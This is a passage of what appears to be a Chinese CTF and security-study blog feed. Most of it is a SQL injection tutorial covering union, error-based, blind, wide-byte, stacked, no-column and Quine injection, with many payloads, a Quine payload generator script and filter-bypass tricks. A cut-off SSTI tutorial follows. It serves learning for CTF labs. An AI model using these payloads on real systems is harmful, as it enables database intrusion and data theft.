class="hljs-number">8</span>]:<br>            byte = (byte &lt;&lt; <span class="hljs-number">1</span>) | bit<br>        byte_array.append(byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(byte_array)<br><br><span class="hljs-comment"># 手动输入密文和密钥</span><br>cipher = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文 (c): &quot;</span>))<br>key_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥 (key): &quot;</span>)<br>key = <span class="hljs-built_in">eval</span>(key_input)<br><br><span class="hljs-comment"># 解密密文</span><br>decrypted_bits = decrypt(cipher, key)<br>decrypted_bytes = bits_to_bytes(decrypted_bits)<br><br><span class="hljs-comment"># 打印解密后的内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted bytes (hex):&quot;</span>, decrypted_bytes.<span class="hljs-built_in">hex</span>())<br><span class="hljs-keyword">try</span>:<br>    flag = decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag (decoded):&quot;</span>, flag)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag contains non-UTF-8 bytes.&quot;</span>)<br></code></pre></td></tr></table></figure><p>背包密码</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>png</tag>
      
      <tag>zip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入总结</title>
    <link href="/2024/07/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言:系统的再复习总结一次sql注入，最近比赛比较少见了，但还是要学会的。</p><h2 id="一-sql注入的概念"><a class="markdownIt-Anchor" href="#一-sql注入的概念"></a> 一、sql注入的概念</h2><p>SQL注入（SQL Injection）是一种网络攻击技术，攻击者通过在输入字段中插入恶意的SQL代码，利用应用程序对用户输入处理不当的漏洞，诱使其执行未经授权的SQL查询。这种攻击可以导致数据库中的敏感数据泄露、数据篡改或删除，甚至让攻击者获得对整个数据库系统的控制。SQL注入常见于不安全的Web应用程序中，是一种严重的安全威胁，通常需要通过参数化查询、预处理语句和输入验证等方法进行防御。是ctf比赛中常考的题目。</p><h2 id="二-寻找sql注入点"><a class="markdownIt-Anchor" href="#二-寻找sql注入点"></a> 二、寻找sql注入点</h2><p>通常sql注入的题目都有明显的特征，比如填表格，登陆账号这些。</p><p>1.在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在Sql注入</p><p>判断：id=1’（常见）id=1&quot; id=1’) id=1’)) id=1&quot;) id=1&quot;))</p><p>2.通常通过get,post,cookie等请求再到相应的http头信息查找敏感信息</p><p>3.构造不同的语句检测异常</p><h2 id="三-sql注入类型"><a class="markdownIt-Anchor" href="#三-sql注入类型"></a> 三、sql注入类型</h2><p>常见的主要还是MySQL注入,主要以这个为切入点。</p><p>建议可以搭建一个sql-labs的靶场，网上都有教程，自己检索。</p><h3 id="联合注入"><a class="markdownIt-Anchor" href="#联合注入"></a> 联合注入</h3><h4 id="类型判断"><a class="markdownIt-Anchor" href="#类型判断"></a> 类型判断</h4><p>数字型:<code>select * from table where id =$id</code></p><p>字符型:<code>select * from table where id='$id'</code></p><p>判断的时候通常通过永真式和永假式进行判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1 and 1=1 #永真式   select * from table where id=1 and 1=1<br>1 and 1=2 #永假式   select * from table where id=1 and 1=2<br><span class="hljs-section">#若永假式运行错误，则说明此SQL注入为数字型注入</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1&#x27; and &#x27;1&#x27;=&#x27;1<br>1&#x27; and &#x27;1&#x27;=&#x27;2<br><span class="hljs-section">#若永假式运行错误，则说明此SQL注入为字符型注入</span><br></code></pre></td></tr></table></figure><h4 id="字段个数"><a class="markdownIt-Anchor" href="#字段个数"></a> 字段个数</h4><p>通常用<code>order by</code>查询字段的个数</p><p>挨个查通常就能查到临界值</p><p>用sql-labs第一题来测试一下，尝试</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0.png" alt="字段个数"></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B01.png" alt="字段个数1"></p><p>如图可以判断出3是临界值</p><h4 id="查找显示位"><a class="markdownIt-Anchor" href="#查找显示位"></a> 查找显示位</h4><p>使用<code>union select</code>查找显示位，需要判断具体个数在前端显示，通常将前面的改成0或-1,这里的目的是使第一个查询不存在，显示第二个查询结果，通过显示得出显示位</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%98%BE%E7%A4%BA%E4%BD%8D.png" alt="显示位"></p><h4 id="爆库名"><a class="markdownIt-Anchor" href="#爆库名"></a> 爆库名</h4><p>使用database(),返回当前的库名</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E5%BA%93.png" alt="爆库"></p><h4 id="爆表名"><a class="markdownIt-Anchor" href="#爆表名"></a> 爆表名</h4><p>基于已知的库名进行爆表，主要有以下函数</p><p><code>group_concat()</code>:使数据能在一行输出</p><p><code>information_schema.tables</code>:存储了数据表的元数据信息使用<code>table_name</code>和<code>table_schema</code>字段</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E8%A1%A8.png" alt="爆表"></p><h4 id="爆列名"><a class="markdownIt-Anchor" href="#爆列名"></a> 爆列名</h4><p>基于表名的基础上，进一步爆列名</p><p>与上文类似，用information_schema.columns和column_name来</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E5%88%97.png" alt="爆列"></p><h4 id="爆信息"><a class="markdownIt-Anchor" href="#爆信息"></a> 爆信息</h4><p>基于已知的列名爆出信息</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?id=-1&#x27;union select 1,group<span class="hljs-emphasis">_concat(email_</span>id),3 from emails%23<br></code></pre></td></tr></table></figure><p>想获得所有列对应的信息的可以使用<code>concat_ws</code></p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E7%88%86%E4%BF%A1%E6%81%AF.png" alt="爆信息"></p><h3 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入"></a> 报错注入</h3><p>本质使用函数报错，通过报错获得想要的数据，前提是后端没有屏蔽信息。</p><h4 id="xpath导致的报错"><a class="markdownIt-Anchor" href="#xpath导致的报错"></a> Xpath导致的报错</h4><p>归类为 XPath 格式不正确或缺失导致报错</p><h5 id="updatexml"><a class="markdownIt-Anchor" href="#updatexml"></a> updatexml()</h5><p>是改变 XML 文档中符合条件的值，其语法如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">updatexml(XML<span class="hljs-emphasis">_document,XPath_</span>string,new<span class="hljs-emphasis">_value)</span><br></code></pre></td></tr></table></figure><p>直接使用有缺陷会进行报错，<code>XPATH syntax error: '~'</code></p><p>可以结合concat配合使用，如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">and updatexml(1,concat(0x7e,(database()),0x7e),1)<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99.png" alt="报错"></p><p>接着按上面的流程来爆表</p><p>值得注意的是该函数报错长度存在字符长度限制，所以需要limit限制读行如图所示</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99-1.png" alt="报错-1"></p><p>除了limit限制之外，也可以使用substr(xxxxxx,1,30)这样的形式获得</p><h5 id="extractvalue"><a class="markdownIt-Anchor" href="#extractvalue"></a> extractvalue()</h5><p>用于从 XML 格式的数据中提取指定节点的值。用法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">extractvalue(XML<span class="hljs-emphasis">_document,xpath_</span>string)<br></code></pre></td></tr></table></figure><p>语法基本和updatexml差不多，只是少一位，如图显示</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99-2.png" alt="报错-2"></p><p>注意这里的报错限制和updatexml也是一致的</p><h4 id="主键重复导致的报错"><a class="markdownIt-Anchor" href="#主键重复导致的报错"></a> 主键重复导致的报错</h4><p>主键报错注入是由于<code>rand()</code>，<code>count()</code> ，<code>floor()</code>三个函数和一个<code>group by</code>语句联合使用造成的，缺一不可</p><p><code>rand()</code>函数的基础语法是这样的，它的参数被叫做 seed(种子)，当种子为空的时候，<code>rand()</code>函数会返回一个<code>[0,1)</code>范围内的随机数，当种子为一个数值时，则会返回一个可复现的随机数序列</p><p><code>floor()</code>函数的作用就是返回小于等于括号内该值的最大整数，也就是取整，它这里的取整不是进行四舍五入，而是直接留下整数位，去掉小数位，如果是负数则整数位需要加一，也就是<strong>去一法</strong></p><p><code>count()</code>得到行数</p><p><code>group by</code> 列名</p><h3 id="盲注"><a class="markdownIt-Anchor" href="#盲注"></a> 盲注</h3><h4 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h4><p>在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。</p><p>以sqli-labs举例当输入正确的时候只会回显一句话，输入错误的时候就没有回显。</p><h5 id="判断数据库类型"><a class="markdownIt-Anchor" href="#判断数据库类型"></a> 判断数据库类型</h5><p>使用exists()函数，通过语句判断是哪种类型</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">//判断是否是 Mysql数据库<br> exists(select<span class="hljs-emphasis">*from information_schema.tables) --+</span><br><span class="hljs-emphasis">//判断是否是 access数据库</span><br><span class="hljs-emphasis"> exists(select*</span>from msysobjects) --+<br>//判断是否是 Sqlserver数据库<br> exists(select<span class="hljs-emphasis">*from sysobjects) --+</span><br></code></pre></td></tr></table></figure><h5 id="判断数据库名"><a class="markdownIt-Anchor" href="#判断数据库名"></a> 判断数据库名</h5><p>先通过<code>length()函数</code>和二分法判断出数据库的长度</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/bool.png" alt="bool"></p><p>通过调整判断得到database的长度，然后进行尝试字母</p><p>可以直接使用判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">substr(database(),1,1)=&#x27;s&#x27;<br></code></pre></td></tr></table></figure><p>也可以结合ascii()来判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr(database(),1,1))=115<br></code></pre></td></tr></table></figure><h5 id="判断表字段"><a class="markdownIt-Anchor" href="#判断表字段"></a> 判断表字段</h5><p>exists(select id from emails)–+可以直接懵看看</p><p>判断表的个数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">(select count(table<span class="hljs-emphasis">_name) from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=&#x27;security&#x27;)=4 --+</span><br></code></pre></td></tr></table></figure><p>判断表的长度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">length((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1))=6--+</span><br></code></pre></td></tr></table></figure><p>判断表的内容</p><p>这个是直接判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">substr((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1),1,1)=&#x27;e&#x27; --+</span><br></code></pre></td></tr></table></figure><p>用ascii来判断</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr((select table<span class="hljs-emphasis">_name from information_</span>schema.tables where table<span class="hljs-emphasis">_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></code></pre></td></tr></table></figure><h5 id="判断字段数据"><a class="markdownIt-Anchor" href="#判断字段数据"></a> 判断字段数据</h5><p>先判断长度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">length((select email<span class="hljs-emphasis">_id from emails limit 0,1))&gt;2--+</span><br></code></pre></td></tr></table></figure><p>再判断内容</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ascii(substr((select email<span class="hljs-emphasis">_id from emails limit 0,1),2,1))&gt;100 %23</span><br></code></pre></td></tr></table></figure><p><strong>通常布尔还是sqlmap来吧手注太累了</strong></p><h4 id="时间盲注"><a class="markdownIt-Anchor" href="#时间盲注"></a> 时间盲注</h4><p>通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。</p><h5 id="判断库名"><a class="markdownIt-Anchor" href="#判断库名"></a> 判断库名</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+<br></code></pre></td></tr></table></figure><p>if(expr1,expr2,expr3)    如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</p><p>基本流程与布尔盲注类似</p><h3 id="http注入"><a class="markdownIt-Anchor" href="#http注入"></a> HTTP注入</h3><p>流程基本相似，主要再UA头，cookie，Referer和xff这几种情况来看。</p><p>利用报错注入得到答案</p><h3 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入"></a> 宽字节注入</h3><p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code>addslashes</code> 等对特殊字符进行转移的绕过。反斜杠 <code>\</code> 的十六进制为 <code>%5c</code>，在你输入 <code>%bf%27</code> 时，函数遇到单引号自动转移加入 <code>\</code>，此时变为 <code>%bf%5c%27</code>，<code>%bf%5c</code> 在 GBK 中变为一个宽字符「縗」。<code>%bf</code> 那个位置可以是 <code>%81-%fe</code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p><h3 id="堆叠注入"><a class="markdownIt-Anchor" href="#堆叠注入"></a> 堆叠注入</h3><p>分号（;）是用来表示一条sql语句的结束。在 ; 结束一个sql语句后继续构造下一条语句，会另外执行。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。<br><img src="/../../images/%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5.png" alt="堆叠注入"></p><p>图中继续执行了更新id为1 的用户的密码信息</p><p>缺点：并不是每一个环境都适合堆叠注入，且在堆叠前还需要知道一些信息才能正常注入。</p><h3 id="无列名注入"><a class="markdownIt-Anchor" href="#无列名注入"></a> 无列名注入</h3><p>参考：<a href="https://err0r.top/article/mardasctf/">文章</a></p><p>简单的讲以下核心的内容</p><p>正常在order by 之后知道字段个数后</p><p>比如使用查询，这里的默认是table</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select 1,2,3 union select * from table;<br></code></pre></td></tr></table></figure><p>接下来这个语句</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select <span class="hljs-code">`2`</span> from (select 1,2,3,4,5 union select * from table)a;<br></code></pre></td></tr></table></figure><p>这样的查询，可以得到一个派生的表，这里的a是派生的表的别称</p><p>这里前面的2是引用的2的列，成了一个新的表</p><p>如果过滤了反引号</p><p>可以继续用别名代替，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;<br></code></pre></td></tr></table></figure><p>这里就是调用表里面的4的列。</p><p>再次基础上可以进行多表查询</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from table)a;<br></code></pre></td></tr></table></figure><p>这边的0x2d是<code>-</code>,这里的派生表2，3的表生成新的表。</p><p>这里利用join函数可以进行无column的查询</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">concat(0x7e,(select <span class="hljs-emphasis">*from (select *</span>from output a join output b)c))<br></code></pre></td></tr></table></figure><p>因为是同一个表，构成的新表就会得到所有的列的信息，从而进行绕过。</p><p>例题参照<a href="https://www.nssctf.cn/problem/2034">[NISACTF 2022]join-us</a></p><h3 id="quine注入"><a class="markdownIt-Anchor" href="#quine注入"></a> Quine注入</h3><p><a href="https://blog.csdn.net/qq_35782055/article/details/130348274?spm=1001.2101.3001.6650.3&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-3-130348274-blog-125531088.235%5Ev43%5Epc_blog_bottom_relevance_base2&amp;utm_relevant_index=6">参考文章</a>，也是刷题偶观，记录一下</p><p>quine注入即查询的结果是查询的语句，举个简单的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;.&quot;,char(46),&quot;.&quot;);<br></code></pre></td></tr></table></figure><p>匹配字符串&quot;.“中ascii码为46的字符并替换为”.“,也就是将”.“转换为”.&quot;并返回</p><p>在实际替换中，单引号会变成双引号，可以引入char(34)和char(39)进行替换，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&quot;\&quot;\&quot;&quot;,char(34),char(39));<br></code></pre></td></tr></table></figure><p>这里面是连续两个双引号用斜杠进行正常的输入，通过匹配会输出’’</p><p>所以替换的就变成了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;<br></code></pre></td></tr></table></figure><p>这一步就是替换单双引号</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39));<br></code></pre></td></tr></table></figure><p>然后替换为相关字符</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);<br></code></pre></td></tr></table></figure><p>最后直接来个脚本吧，没太深入的明白，看看先能写题就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_sql</span>():<br>    sql = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;输入你的SQL语句, 不用写关键查询的信息 形如 1&#x27;union select #\n&quot;</span>)<br>    <span class="hljs-keyword">return</span> sql<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_quotes</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_base</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_base_to_sql</span>(<span class="hljs-params">sql, base</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_sql_with_base</span>(<span class="hljs-params">base, sql</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;--+&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;--+&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;--+&quot;</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">in</span> sql:<br>        <span class="hljs-keyword">return</span> sql.split(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">0</span>] + base + <span class="hljs-string">&quot;#&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> sql  <span class="hljs-comment"># 如果sql中没有注释符号，则返回原始sql</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_sql</span>(<span class="hljs-params">sql</span>):<br>    <span class="hljs-keyword">return</span> sql.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;.&quot;&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 输入SQL语句</span><br>    sql = input_sql()<br>    <span class="hljs-comment"># 替换单引号为双引号</span><br>    sql2 = replace_quotes(sql)<br>    <span class="hljs-comment"># 生成base字符串</span><br>    base = generate_base()<br>    <span class="hljs-comment"># 将base添加到sql语句中</span><br>    sql_with_base = add_base_to_sql(sql2, base)<br>    <span class="hljs-comment"># 用base修补sql语句</span><br>    patched_sql = patch_sql_with_base(base.replace(<span class="hljs-string">&quot;.&quot;</span>, sql_with_base), sql)<br>    <span class="hljs-comment"># 格式化最终SQL语句</span><br>    final_sql = format_sql(patched_sql)<br>    <span class="hljs-comment"># 输出最终结果</span><br>    <span class="hljs-built_in">print</span>(final_sql)<br><span class="hljs-comment"># 运行主函数</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><a href="https://www.nssctf.cn/problem/334">例题</a></p><h3 id="四-刷题笔记"><a class="markdownIt-Anchor" href="#四-刷题笔记"></a> 四、刷题笔记</h3><h3 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h3><h4 id="过滤-or"><a class="markdownIt-Anchor" href="#过滤-or"></a> 过滤 or</h4><p>使用||代替</p><h4 id="过滤-2"><a class="markdownIt-Anchor" href="#过滤-2"></a> 过滤 =</h4><p>使用like代替</p><h4 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h4><p>使用/**/绕过</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti模板注入学习</title>
    <link href="/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/03/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>前言:主要讲的python的jinjia2,如果以后遇到其他相关的会继续补充。</p><p>参考文章:</p><p>1.<a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇)</a></p><p>2.<a href="https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=%7B%22request%5Fid%22%3A%22171998276316800182178648%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=171998276316800182178648&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~hot_rank-5-120739989-null-null.nonecase&amp;utm_term=ssit&amp;spm=1018.2226.3001.4450">SSTI模板注入总结</a></p><p>3.<a href="https://xz.aliyun.com/t/6885?time__1311=n4%2BxnD0DRDyB5q053b7eit7Dt3MKAKDkWeD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-0">Python模板注入(SSTI)深入学习</a></p><p>4.<a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI模板注入绕过(进阶篇)</a></p><p>5.<a href="https://blog.csdn.net/q20010619/article/details/120493997">CTFshow刷题日记-WEB-SSTI(web361-372)_ctfshow ssti 371-CSDN博客</a></p><h2 id="一-基础知识"><a class="markdownIt-Anchor" href="#一-基础知识"></a> 一、基础知识</h2><h3 id="1初步了解"><a class="markdownIt-Anchor" href="#1初步了解"></a> 1.初步了解</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)</p><p>当使用一些框架的时候，服务端接收了用户的恶意输入以,未经处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p><p>举个简单的例子</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">from flask import Flask, request, render<span class="hljs-emphasis">_template_</span>string<br>app = Flask(<span class="hljs-strong">__name__</span>)<br>@app.route(&#x27;/&#x27;)<br>def home():<br><span class="hljs-code">    return &#x27;&#x27;&#x27;</span><br><span class="hljs-code">    &lt;form action=&quot;/greet&quot; method=&quot;post&quot;&gt;</span><br><span class="hljs-code">    